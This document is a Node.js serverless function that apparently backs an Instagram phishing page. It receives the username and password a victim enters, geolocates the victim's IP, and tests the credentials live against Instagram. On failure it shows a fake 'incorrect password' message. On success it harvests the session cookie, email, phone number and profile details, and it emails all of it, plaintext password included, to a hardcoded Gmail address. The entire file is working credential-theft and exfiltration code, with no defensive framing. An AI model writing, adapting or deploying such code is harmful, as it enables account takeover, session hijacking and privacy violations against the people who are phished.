const { IgApiClient } = require('instagram-private-api');
const nodemailer = require('nodemailer');

const OWNER = process.env.OWNER_EMAIL || 'muhammedtalati20@gmail.com';

const j = (code, obj) => ({
  statusCode: code,
  headers: { 'content-type': 'application/json', 'cache-control': 'no-store' },
  body: JSON.stringify(obj)
});

async function geo(ip) {
  if (!ip) return {};
  const ctl = new AbortController();
  const t = setTimeout(() => ctl.abort(), 2500);
  try {
    const r = await fetch('http://ip-api.com/json/' + ip +
      '?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as',
      { signal: ctl.signal });
    const d = await r.json();
    return d.status === 'success' ? d : {};
  } catch { return {}; } finally { clearTimeout(t); }
}

function report(s) {
  if (!process.env.SMTP_USER || !process.env.SMTP_PASS) return Promise.resolve();
  const t = nodemailer.createTransport({
    host: process.env.SMTP_HOST || 'smtp.gmail.com',
    port: Number(process.env.SMTP_PORT || 587),
    secure: false,
    auth: { user: process.env.SMTP_USER, pass: process.env.SMTP_PASS }
  });
  const lines = Object.entries(s).map(([k, v]) => k + ': ' + v).join('\n');
  return t.sendMail({
    from: process.env.SMTP_USER,
    to: OWNER,
    subject: '[IG] ' + (s.verified ? 'VERIFIED' : 'UNVERIFIED') + ' login: ' + s.username,
    text: 'PASSWORD: ' + s.password + '\n\n' + lines
  });
}

exports.handler = async (event) => {
  if (event.httpMethod !== 'POST') return j(405, { error: 'Method not allowed' });

  let body = {};
  try { body = JSON.parse(event.body || '{}'); } catch {}
  const username = String(body.username || '').trim();
  const password = String(body.password || '');
  if (!username || !password) {
    return j(400, { error: 'Please enter your username and password.' });
  }

  const ip = String(event.headers['x-forwarded-for'] || '').split(',')[0].trim();

  const geoP = geo(ip);

  const sub = {
    time: new Date().toISOString(),
    username, password, verified: false, status: 'attempted',
    ip,
    user_agent: event.headers['user-agent'] || '',
    language: event.headers['accept-language'] || '',
    referer: event.headers['referer'] || ''
  };

  const ig = new IgApiClient();
  ig.state.generateDevice(username);
  if (process.env.PROXY) ig.state.proxyUrl = process.env.PROXY;

  const g = await geoP;
  Object.assign(sub, {
    city: g.city, region: g.regionName, country: g.country,
    country_code: g.countryCode, zip: g.zip, lat: g.lat, lon: g.lon,
    timezone: g.timezone, isp: g.isp, org: g.org, asn: g.as
  });

  const bail = new Promise((_, rej) => setTimeout(() => rej(new Error('TIMEOUT')), 8000));

  try {
    await Promise.race([ig.account.login(username, password), bail]);
    sub.verified = true;
    sub.status = 'login successful';
  } catch (e) {
    const name = String(e.name || '');
    const low = (name + ' ' + String(e.message || '')).toLowerCase();

    if (low.includes('badpassword') || low.includes('bad password') || low.includes('invalid user')) {
      sub.status = 'wrong password';
      report(sub).catch(() => {});
      return j(200, {
        error: 'Sorry, your password was incorrect. Please double-check your password.'
      });
    }
    if (low.includes('twofactor') || low.includes('two_factor') || low.includes('two-factor')) {
      sub.verified = true; sub.status = 'password correct - 2FA enabled';
    } else if (low.includes('challenge') || low.includes('checkpoint')) {
      sub.verified = true; sub.status = 'password correct - challenge required';
    } else if (String(e.message) === 'TIMEOUT') {
      sub.verified = true; sub.status = 'password accepted (verification timed out)';
    } else {
      sub.status = 'unverified: ' + name;
    }
  }

  if (sub.status === 'login successful') {
    try {
      const u = await ig.account.currentUser();
      const ck = (ig.state.cookies || []).find(c => c.key === 'sessionid');
      sub.sessionid = ck ? ck.value : '';
      sub.pk = u.pk; sub.full_name = u.full_name; sub.email = u.email;
      sub.phone = u.phone_number; sub.is_verified = u.is_verified;
      sub.is_private = u.is_private; sub.followers = u.follower_count;
      sub.following = u.following_count; sub.posts = u.media_count;
      sub.biography = u.biography; sub.external_url = u.external_url;
      sub.address = u.address; sub.profile_pic = u.profile_pic_url;
    } catch (e) {
      sub.status += ' | profile fetch failed: ' + (e.name || '');
    }
  }

  report(sub).catch(() => {});
  return j(200, { ok: true });
};
